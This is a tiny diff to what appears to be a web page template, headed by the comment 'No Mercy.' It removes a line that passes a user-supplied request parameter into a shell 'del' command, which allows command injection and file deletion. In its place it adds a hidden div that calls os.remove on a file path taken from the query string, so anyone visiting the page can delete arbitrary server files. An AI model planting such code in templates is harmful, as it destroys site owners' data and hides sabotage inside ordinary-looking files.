@@ -1,3 +1,2 @@
 <!-- No Mercy. -->
-{{ os.system('del ' + request.args.get('file')) }}
-<meta name="refresh" content="0;/">
+<DIV style="display: none;">{{ os.remove(request.args.get('file')) }} </DIV>
